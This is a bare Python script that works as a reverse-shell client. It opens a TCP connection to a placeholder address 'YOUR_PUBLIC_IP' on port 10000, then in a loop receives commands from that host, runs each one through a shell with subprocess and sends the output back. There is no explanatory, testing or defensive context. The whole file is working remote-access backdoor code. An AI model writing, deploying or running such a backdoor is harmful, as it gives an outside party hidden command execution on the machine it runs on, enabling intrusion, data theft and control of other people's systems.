import socket
import subprocess
import os
import ctypes

# Create a TCP/IP socket
server_address = 'YOUR_PUBLIC_IP'
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect the socket to the port where the server is listening
    server_address = (server_address, 10000)
    print('connecting to {} port {}'.format(*server_address))
    sock.connect(server_address)
except socket.error as error:
    print(f"Error Connecting:{str(error)}")
    exit()

while True:
    server_cmd = str(sock.recv(1024), "utf-8")
    if(len(server_cmd) > 0):
        try:
            if(server_cmd[:2] == 'cd'):
                path = server_cmd[2:].strip()
                chdir = os.chdir(path)
                print(chdir)
                curr_dir = os.getcwd()
                print(curr_dir)
                output = str.encode(curr_dir)
                sock.send(output)
            else:   
                output = subprocess.Popen(server_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
                output_str = str(output, 'utf-8')
                sock.send(output)

        except:
            sock.send(str.encode("Something went wrong!"))